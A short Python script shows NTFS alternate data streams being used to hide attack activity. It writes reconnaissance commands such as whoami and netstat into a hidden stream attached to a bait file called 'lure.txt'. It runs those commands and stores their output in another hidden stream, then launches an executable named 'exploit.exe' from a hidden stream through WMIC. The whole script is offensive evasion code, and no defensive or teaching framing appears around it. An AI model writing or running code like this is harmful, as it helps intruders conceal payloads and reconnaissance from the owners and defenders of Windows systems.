import os

def createADS(f, s):
    return f + ":" + s

bait = "lure.txt"
output = createADS(bait, "data.txt")
command = createADS(bait, "tasks.txt")

with open(command, "w") as cmd:
    cmd.write("echo 'System Compromised'\n")
    cmd.write("whoami\n")
    cmd.write("netstat -ano\n")

with open(command, "r") as c:
    for line in c:
        os.system(line.strip() + " >> " + output)

payload = "exploit.exe"
payload_path = os.path.join(os.getcwd(), createADS(bait, payload))
os.system("wmic process call create " + payload_path)
